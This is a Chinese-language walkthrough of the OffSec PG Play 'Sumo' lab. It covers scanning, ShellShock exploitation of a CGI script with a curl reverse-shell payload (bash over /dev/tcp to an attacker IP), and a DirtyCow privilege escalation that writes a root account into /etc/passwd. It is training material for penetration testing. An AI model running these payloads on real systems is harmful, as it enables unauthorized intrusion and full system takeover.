###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Sumo
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.180.87 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.180.87:80
Open 192.168.180.87:22

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAO7z5YzRXLGqibzkX44TJn616aaDE3rvYcPwMiyWE3/J+WrJNkyMIRfqggIho1dxtYOA5xXP+UCk3osMe5XlMlocy3McGlmqhSrMFbQOOFrvm/PMAF649Xq/rDm2M/m+sXgxvQmJyLV36DqwbxxCL1wrICNk4cxfDG1K2yTGVw/rAAAAFQDa/l4YfWS1CNCRhv0XZbwXkGdxfwAAAIEAnMQzPH7CGQKfsHXgyFl3lsOMpj0ddXHG/rWZvFn+8NdAh48do0cN88Bti8C4Asibcp0zbEEga9KgxeR+dQi2lg3nHRzHFTPTnjybfUZqST4fU1VE9oJFCL3Q1cWHPfcvQzXNqbVDwMLSqpRYAbexXET64DgwX4fw8FSV6efKaQQAAACAVGZB5+2BdywfhdFT0HqANuHvcLfjGPQ8XkNTcO+XFSWxNFwTnLOzZE8FVNsTIBdMjXKjbWOwLMkzb4EHhkeyJglqDWvBoVTiDpXbRxctFiGt0Z83EvTJJSEAGYDCMHkux/dcVYe0WNjJYX9GBjXB2yhL/2kZuH0lzoNx9fITQ/U=
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwlghTOhfNbdMRHJF0N2ho6RlE8HR+wVE5aoFt/PPu6dveDLV7xt7GLS8Q849r1tAScErRUVryrD6gwQ0DB45hGrw8POQlnUHggTjyNp3+sshrWqRs5Dp93LL3NvhpBXl6YD9bJEC3e2qXY3Vwm+Wc/GE/9SxlB+aHL/ekjgNVWgpMT1y/fCKAWlF4TLKUl7Xc21GGWnQptGyYweSbefo4TPa7neg+YdpZkqMWaoK/eEbG+Ze5ocSEWrmB3jQMDHhgeZDO/gB3iuxSDrOToSZmsNcW6TtgqyVyo1q26VIjVRWZPlm9wyR1YB4M85uXZG2DSYu4TFKDwKhXBCqgnSHx
|   256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAf1vV7lVrnTZwOIFZj7gvuahGAK2YAv8dBxFD5jV7Ho5nXHPCulaGcA9aYW9z2ih2JL/0+3zfdPfk3JBYVyrM8=
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

`ffuf`掃
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.180.87/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/big.txt 

.htpasswd               [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 82ms]
.htaccess               [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 74ms]
cgi-bin/                [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 416ms]
index                   [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 68ms]
server-status           [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 67ms]
```

有個`/cgi-bin`再繼續掃
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gobuster dir -u http://192.168.180.87/cgi-bin/ -w /home/kali/SecLists/Discovery/Web-Content/common.txt -x cgi,sh,pl

/test                 (Status: 200) [Size: 14]
/test.sh              (Status: 200) [Size: 14]
Progress: 18912 / 18916 (99.98%)
```

我搜尋`cgi-bin exploit`找到[CGI - Exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#exploit)，用裡面提到的[ShellShock](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#shellshock)發現可以exploit
```
┌──(kali㉿kali)-[~/pgplay/shellshocker]
└─$ python3 shellshocker.py http://192.168.180.87/cgi-bin/test     
Testing http://192.168.180.87/cgi-bin/test with a standard payload using ShellShocker
http://192.168.180.87/cgi-bin/test is exploitable
```

開nc開reverse，等反彈之後可以在`/usr/lib/cgi-bin`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/pgplay/shellshocker]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.215/4444 0>&1' http://192.168.180.87/cgi-bin/test

www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt
6c5a6b61698527658463043952a48312
```

`linpeas.sh`
```
www-data@ubuntu:/tmp$ wget 192.168.45.215/linpeas.sh
www-data@ubuntu:/tmp$ chmod +x linpeas.sh
www-data@ubuntu:/tmp$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                          
cat: write error: Broken pipe                                                                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
   

╔══════════╣ Installed Compilers
ii  gcc                             4:4.6.3-1ubuntu5             GNU C compiler                                                             
ii  gcc-4.6                         4.6.3-1ubuntu5               GNU C compiler
/usr/bin/gcc
```

想要嘗試`dirtycow`，先下載[dirty.c](https://github.com/firefart/dirtycow)然後放到靶機
```
www-data@ubuntu:/tmp$ wget 192.168.45.215/dirty.c

www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

發現會有`cc1`的error，嘗試[修改PATH](https://blog.csdn.net/myWorld001/article/details/125190566)，剛好上面`linpeas`的結果有說是`4.6`版本的`gcc`
```
www-data@ubuntu:/tmp$ gcc --version
gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3

www-data@ubuntu:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

www-data@ubuntu:/tmp$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.6
```

之後執行它就可以切成`firefart`使用者
```
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt

www-data@ubuntu:/tmp$ chmod +x dirty

www-data@ubuntu:/tmp$ ./dirty

Please enter the new password: pass
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
```

切成`firefart`之後可到/root得proof.txt
```
www-data@ubuntu:/tmp$ su firefart
su: must be run from a terminal
www-data@ubuntu:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@ubuntu:/tmp$ su firefart
Password: pass

firefart@ubuntu:~# cat proof.txt
ac10c174fa07e6bfe0a500d2a09f2bc8
```

